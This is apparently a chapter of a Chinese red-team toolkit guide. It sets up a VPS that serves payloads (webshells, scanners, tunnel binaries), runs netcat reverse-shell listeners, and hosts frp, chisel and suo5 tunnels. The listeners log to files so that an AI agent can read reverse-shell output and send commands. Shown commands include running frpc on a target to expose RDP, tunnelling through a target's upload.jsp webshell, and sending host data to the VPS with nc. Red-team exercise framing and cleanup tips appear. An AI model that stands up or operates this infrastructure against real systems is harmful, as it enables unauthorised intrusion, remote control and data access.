# 05 · VPS 基础设施

> 一台公网 VPS 做三件事：**载荷分发**、**反弹 Shell 落地**、**隧道出口**。
> 1 vCPU / 2 GB 够用。

---

## 架构

```
┌──────────────── VPS ─────────────────┐
│  nginx  :80 + :9100    载荷分发       │
│  tmux   :9000-9999     反弹 Shell 监听 │
│  frps   :7000          隧道服务端      │
│  socat / nc / tmux     基础工具        │
└──────────────────────────────────────┘
          ↑                    ↑
     目标机器回连          本机 frpc 连入
```

---

## ⭐ 先看 80/443 够不够

**大多数云的安全组默认只开 22/80/443。** 先探测：

```bash
for p in 22 80 443 9000 9100; do
  timeout 4 bash -c "echo > /dev/tcp/YOUR_VPS_IP/$p" 2>/dev/null \
    && echo "$p open" || echo "$p blocked"
done
```

**如果 80/443 开放但 9000/9100 blocked**，有两种走法：

| 走法 | 载荷 | 反弹 Shell | 并发会话 |
|---|---|---|---|
| **不配安全组**（立即可用） | `http://VPS/` (:80) | `:443` | **1 个** |
| **配安全组**（推荐） | `http://VPS:9100/` | `:9000-9999` | 多个 |

**一个端口只能收一个 shell。** 真实演练要多个目标/多条隧道，所以建议配安全组。

### 配安全组（阿里云示例）

```
ECS 控制台 → 实例 → 安全组 → 配置规则 → 入方向 → 手动添加

  授权策略    允许
  优先级      1
  协议类型    自定义 TCP
  端口范围    9000/9999
  授权对象    0.0.0.0/0
  描述        redteam-shell

再加一条：端口范围 9100/9100
```

> ⚠️ **`0.0.0.0/0` 是全网开放。** 9100 上的载荷目录公开可下载，**演练结束建议删规则**。

### 用 CLI 配（如果装了 aliyun 命令行）

```bash
aliyun ecs AuthorizeSecurityGroup \
  --RegionId cn-hangzhou \
  --SecurityGroupId <sg-id> \
  --IpProtocol tcp \
  --PortRange 9000/9999 \
  --SourceCidrIp 0.0.0.0/0 \
  --Priority 1
```

---

## 部署

跑安装器的 `5-vps.cmd`，会做完下面全部。

### 1. 基础包

```bash
# Alibaba Cloud Linux / CentOS
dnf install -y tmux nmap-ncat socat lsof

# Ubuntu / Debian
apt-get install -y tmux netcat-openbsd socat lsof
```

### 2. 载荷服务（nginx）

```nginx
server {
    listen 9100;
    listen 80;
    server_name _;
    root /opt/payload;
    autoindex on;
    autoindex_exact_size off;
    autoindex_localtime on;
    access_log /var/log/nginx/payload.log;
    location / {
        add_header Access-Control-Allow-Origin *;
        try_files $uri $uri/ =404;
    }
}
```

目录结构：

```
/opt/payload/
  ├─ linux/      fscan gogo suo5 chisel frpc frps
  ├─ windows/    fscan.exe / 冰蝎马 / 哥斯拉马
  ├─ webshell/   各类 webshell
  ├─ misc/
  └─ .logs/      tmux 监听输出（智能体直接 cat 读）
```

### 3. 监听会话

`rt-bootstrap` 幂等启动 5 个 tmux 会话（9000-9004），每个跑 `nc -lvnp <port>`，
输出重定向到 `/opt/payload/.logs/shell-<port>.log`。

**为什么用日志文件而不是 attach**：智能体无法交互式 attach tmux，
但可以 `cat` 日志。这样「读回反弹 shell 输出」就变成一次普通文件读取。

### 4. rt 运维工具

```bash
rt status              # 总览：会话 / 监听 / nginx / 载荷大小
rt listen 9005         # 开新监听
rt listen-multi 9000-9010
rt read 9000 40        # 读回输出（智能体用这个）
rt send 9000 'id'      # 向会话下发数据
rt sessions            # 列 tmux 会话
rt attach shell-9000   # 人工接回
rt kill 9000           # 关单个 + 清日志
rt killall             # 全清（用完必做）
rt payload             # 列载荷
```

### 5. systemd 单元

```ini
[Unit]
Description=RedTeam listener bootstrap
After=network.target

[Service]
Type=oneshot
RemainAfterExit=yes
Environment=HOME=/root
ExecStart=/usr/local/bin/rt-bootstrap
Restart=no

[Install]
WantedBy=multi-user.target
```

> ⚠️ **不要在 systemd 里用 `ExecStop=tmux kill-server`** —— 服务重启时会把
> 所有会话（包括你正在用的）一起杀掉。

---

## SSH 密钥的坑

WSL 通过 `/mnt/c/...` 访问 Windows 文件时，**权限恒为 0777**（DrvFs 不遵循 chmod）。
`ssh` 会直接拒绝：

```
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0777 for '...' are too open.
```

**解法**：复制到 WSL 原生文件系统（ext4，chmod 生效）：

```bash
cp /mnt/c/Users/YOU/.ssh/id_ed25519_vps ~/.ssh/id_rsa_vps
chmod 600 ~/.ssh/id_rsa_vps
ssh -i ~/.ssh/id_rsa_vps root@YOUR_VPS_IP 'echo ok'
```

然后在 `.env` 里写：

```
REDTEAM_VPS_KEY=~/.ssh/id_rsa_vps
```

> ⚠️ **`.env` 里不要用 `%USERPROFILE%`** —— 那是 Windows 变量，bash 不展开，
> 会被当成字面路径。

---

## 端到端验证

```bash
# 本机 → VPS 回连
( whoami; hostname; id; uname -r ) | timeout 8 nc YOUR_VPS_IP 9000

# VPS 上读回
ssh root@YOUR_VPS_IP 'cat /opt/payload/.logs/shell-9000.log'
```

**期望输出**：

```
Ncat: Listening on 0.0.0.0:9000
Ncat: Connection from <你的公网IP>.
whoami: user
host: YOUR_MACHINE
id: uid=1000(user) gid=1000(user) groups=1000(user),4(adm),20(dialout)...
kernel: 6.18.33.1-microsoft-standard-WSL2
```

---

## 内网穿透（演练时用）

三个隧道工具，按场景选：

| 工具 | 场景 | 端口 |
|---|---|---|
| **frp** | 有公网 VPS，长期稳定 | frps :7000 + vhost |
| **chisel** | 只有 HTTP/HTTPS 出网 | :443 复用 |
| **suo5** | 已拿到 Web 服务器权限，走 HTTP 隧道 | 复用 web 端口 |

**frps 服务端**（VPS 上）：

```bash
# frps.toml
bindPort = 7000
auth.method = "token"
auth.token = "YOUR_TOKEN"

# 启动
frps -c /etc/frp/frps.toml
```

**frpc 客户端**（目标机器上）：

```bash
frpc tcp --server YOUR_VPS_IP:7000 --token YOUR_TOKEN \
         --local-port 3389 --remote-port 13389
```

**suo5**（内存马隧道，无需落地文件）：

```bash
suo5 -t http://TARGET/upload.jsp -l 127.0.0.1:1080
```

---

## 安全提醒

1. **用完必清**：`rt killall` + 删安全组规则
2. **不要把 VPS 当跳板打外网** —— 你的出口 IP 会留在目标日志里
3. **载荷目录别放敏感文件** —— 9100 是公开的
4. **推荐加固**：
   - 载荷服务加 nginx `auth_basic`
   - 反弹 shell 端口加 `knockd` 端口敲门或 iptables 白名单
   - `fail2ban` 防 SSH 爆破
